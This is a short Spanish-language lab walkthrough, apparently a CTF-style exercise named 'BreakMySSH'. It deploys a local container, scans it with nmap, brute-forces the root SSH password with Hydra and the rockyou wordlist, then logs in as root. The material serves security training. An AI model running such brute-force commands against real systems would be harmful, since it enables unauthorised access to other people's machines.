# Laboratorio 3: BreakMySSH

## Descripción
Este laboratorio consiste en explotar una vulnerabilidad en el servicio SSH mediante un ataque de fuerza bruta para obtener acceso a la máquina objetivo.

## Pasos para la resolución

1. **Despliegue del laboratorio:**
   - Ejecutar el comando: `sudo bash auto_deploy.sh breakmyssh.tar`.
  
     ![image](https://github.com/user-attachments/assets/e09b75ce-7691-40a3-af3d-8362621d145b)

  

2. **Reconocimiento:**
   - Verificar la conectividad con la máquina objetivo: `ping 172.17.0.2`.

   ![image](https://github.com/user-attachments/assets/4605ad59-9640-4b5d-97a2-bbed7480ab86)

   - Escanear la máquina con Nmap: `nmap -sV 172.17.0.2`.
  
     ![image](https://github.com/user-attachments/assets/be93d9fb-7c28-4f75-99b7-0d49be246d03)


3. **Ataque de fuerza bruta con Hydra:**
   - Ejecutar el ataque: `hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2`.

     ![image](https://github.com/user-attachments/assets/bbf8295d-2461-4b96-a51d-8067048e9a95)


4. **Acceso SSH:**
   - Conectarse a la máquina: `ssh root@172.17.0.2`.
   - Introducir la contraseña obtenida en el paso anterior.
     
     ![image](https://github.com/user-attachments/assets/e1da8c10-770b-4851-8e4b-36980b0bcc5c)

     


## Conclusión
Se logró obtener acceso a la máquina mediante un ataque de fuerza bruta al servicio SSH.
